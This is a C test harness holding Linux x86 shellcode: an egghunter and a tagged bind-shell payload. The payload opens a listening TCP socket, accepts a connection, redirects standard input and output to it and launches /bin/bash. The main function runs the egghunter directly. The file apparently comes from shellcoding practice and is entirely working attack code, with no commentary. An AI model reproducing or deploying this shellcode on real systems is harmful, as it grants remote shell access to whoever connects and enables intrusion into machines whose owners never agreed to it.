#include <stdio.h>
#include <string.h>

unsigned char payload[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\x83\xc1\x01\x31\xd2\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x66\x68\x87\x07\x66\x6a\x02\x66\xb8\x69\x01\x89\xfb\x89\xe1\x83\xc2\x10\xcd\x80\x66\xb8\x6b\x01\x89\xfb\x31\xc9\x83\xc1\x05\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\x31\xc0\x83\xc0\x3f\x89\xf3\x31\xc9\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x83\xc0\x3f\x83\xc1\x01\xcd\x80\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80\x31\xc0";

unsigned char egghunter[] = \
"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";

main()
{
	printf("payload Shellcode Length:  %d\n", strlen(payload));
	printf("Egghunter Shellcode Length:  %d\n", strlen(egghunter));
	int (*ret)() = (int(*)())egghunter;
	ret();
}

	
